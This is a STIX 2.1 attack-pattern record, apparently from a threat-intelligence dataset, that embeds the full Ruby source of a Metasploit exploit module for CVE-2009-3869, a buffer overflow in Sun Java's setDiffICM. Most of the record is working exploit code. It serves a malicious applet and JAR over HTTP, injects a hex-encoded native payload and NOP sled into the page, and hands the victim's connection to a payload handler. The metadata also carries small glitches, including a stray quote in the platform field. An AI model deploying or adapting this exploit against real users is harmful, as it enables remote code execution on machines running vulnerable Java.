{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--79a5d41f-6849-493b-aba5-4d60fef470b5",
    "created": "2024-08-14T17:05:59.762937Z",
    "modified": "2024-08-14T17:05:59.762941Z",
    "name": "Sun Java JRE AWT setDiffICM Buffer Overflow",
    "description": " This module exploits a flaw in the setDiffICM function in the Sun JVM.  The payload is serialized and passed to the applet via PARAM tags. It must be a native payload.  The effected Java versions are JDK and JRE 6 Update 16 and earlier JDK and JRE 5.0 Update 21 and earlier, SDK and JRE 1.4.2_23 and earlier, and SDK and JRE 1.3.1_26 and earlier.  NOTE: Although all of the above versions are reportedly vulnerable, only 1.6.0_u11 and 1.6.0_u16 on Windows XP SP3 were tested.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/browser/java_setdifficm_bof.rb",
            "external_id": "java_setdifficm_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-3869"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  #\n  # This module acts as an HTTP server\n  #\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Sun Java JRE AWT setDiffICM Buffer Overflow',\n      'Description'    => %q{\n        This module exploits a flaw in the setDiffICM function in the Sun JVM.\n\n        The payload is serialized and passed to the applet via PARAM tags. It must be\n        a native payload.\n\n        The effected Java versions are JDK and JRE 6 Update 16 and earlier,\n        JDK and JRE 5.0 Update 21 and earlier, SDK and JRE 1.4.2_23 and\n        earlier, and SDK and JRE 1.3.1_26 and earlier.\n\n        NOTE: Although all of the above versions are reportedly vulnerable, only\n        1.6.0_u11 and 1.6.0_u16 on Windows XP SP3 were tested.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'jduck'\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2009-3869' ],\n          [ 'OSVDB', '59710' ],\n          [ 'BID', '36881' ],\n          [ 'ZDI', '09-078' ]\n        ],\n      'Payload'        =>\n        {\n          'Space'    => 1024,\n          'BadChars' => '',\n          'DisableNops' => true,\n        },\n      'Platform'       => %w{ win osx },\n      'Targets'        =>\n        [\n=begin\n\nNo automatic targetting for now ...\n\n          [ 'J2SE 1.6_16 Automatic',\n            {\n              'Platform' => %w{ linux osx win },\n              'Arch' => [ARCH_X86, ARCH_PPC]\n            }\n          ],\n=end\n          [ 'J2SE 1.6_16 on Windows x86',\n            {\n              'Platform' => 'win',\n              'Arch' => ARCH_X86\n            }\n          ],\n          [ 'J2SE 1.6_16 on Mac OS X PPC',\n            {\n              'Platform' => 'osx',\n              'Arch' => ARCH_PPC,\n            }\n          ],\n          [ 'J2SE 1.6_16 on Mac OS X x86',\n            {\n              'Platform' => 'osx',\n              'Arch' => ARCH_X86,\n            }\n          ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2009-11-04'\n      ))\n  end\n\n\n  def on_request_uri(cli, req)\n\n    # Create a cached mapping between IP and detected target\n    @targetcache ||= {}\n    @targetcache[cli.peerhost] ||= {}\n    @targetcache[cli.peerhost][:update] = Time.now.to_i\n\n    if (target.name =~ /Automatic/)\n      case req.headers['User-Agent']\n      when /Windows/i\n        print_status(\"Choosing a Windows target\")\n        @targetcache[cli.peerhost][:target] = self.targets[1]\n      when /PPC Mac OS X/i\n        print_status(\"Choosing a Mac OS X PPC target\")\n        @targetcache[cli.peerhost][:target] = self.targets[2]\n      when /Intel Mac OS X/i\n        print_status(\"Choosing a Mac OS X x86 target\")\n        @targetcache[cli.peerhost][:target] = self.targets[3]\n      else\n        print_status(\"Unknown target for: #{req.headers['User-Agent']}\")\n      end\n    end\n\n    # Clean the cache\n    rmq = []\n    @targetcache.each_key do |addr|\n      if (Time.now.to_i > @targetcache[addr][:update]+60)\n        rmq.push addr\n      end\n    end\n\n    rmq.each {|addr| @targetcache.delete(addr) }\n\n\n    # Request processing\n    if (not req.uri.match(/\\.jar$/i))\n\n      # Redirect to the base directory so the applet code loads...\n      if (not req.uri.match(/\\/$/))\n        print_status(\"Sending redirect so path ends with / ...\")\n        send_redirect(cli, get_resource() + '/', '')\n        return\n      end\n\n      # Display the applet loading HTML\n      print_status(\"Sending HTML\")\n      send_response_html(cli, generate_html(payload.encoded),\n        {\n          'Content-Type' => 'text/html',\n          'Pragma' => 'no-cache'\n        })\n      return\n    end\n\n    # Send the actual applet over\n    print_status(\"Sending applet\")\n    send_response(cli, generate_applet(cli, req),\n      {\n        'Content-Type' => 'application/octet-stream',\n        'Pragma' => 'no-cache'\n      })\n\n    # Handle the payload\n    handler(cli)\n  end\n\n\n  def generate_html(pl)\n\n    html = <<-EOF\n<html>\n<head>\n<!-- <meta http-equiv=refresh content=10 /> -->\n</head>\n<body>\n<applet width='100%' height='100%' code='AppletX' archive='JARNAME'>\n<param name='sc' value='SCODE' />\n<param name='np' value='NOPS' />\n</applet>\n</body>\n</html>\nEOF\n    # finalize html\n    jar_name = rand_text_alphanumeric(32)+\".jar\"\n    html.gsub!(/JARNAME/, jar_name)\n\n    # put payload into html\n    debug_payload = false\n    pload = \"\"\n    pload << \"\\xcc\" if debug_payload\n    pload << pl\n    if ((pload.length % 4) > 0)\n      pload << rand_text((4 - (pload.length % 4)))\n    end\n    if debug_payload\n      print_status(\"pload #{pload.length} bytes:\\n\" + Rex::Text.to_hex_dump(pload))\n    end\n    html.gsub!(/SCODE/, Rex::Text.to_hex(pload, ''))\n\n    # put nops into html\n    nops = \"\\x90\\x90\\x90\\x90\"\n    html.gsub!(/NOPS/, Rex::Text.to_hex(nops, ''))\n    #print_status(\"nops #{nops.length} bytes:\\n\" + Rex::Text.to_hex_dump(nops))\n\n    return html\n\n  end\n\n\n  def exploit\n    path = File.join(Msf::Config.data_directory, \"exploits\", \"CVE-2009-3869.jar\")\n    fd = File.open(path, \"rb\")\n    @jar_data = fd.read(fd.stat.size)\n    fd.close\n\n    super\n  end\n\n\n  def generate_applet(cli, req)\n\n    this_target = nil\n    if (target.name =~ /Automatic/)\n      if (@targetcache[cli.peerhost][:target])\n        this_target = @targetcache[cli.peerhost][:target]\n      else\n        return ''\n      end\n    else\n      this_target = target\n    end\n\n    return @jar_data\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-11-04",
    "x_mitre_platforms": [
        "osx'"
    ]
}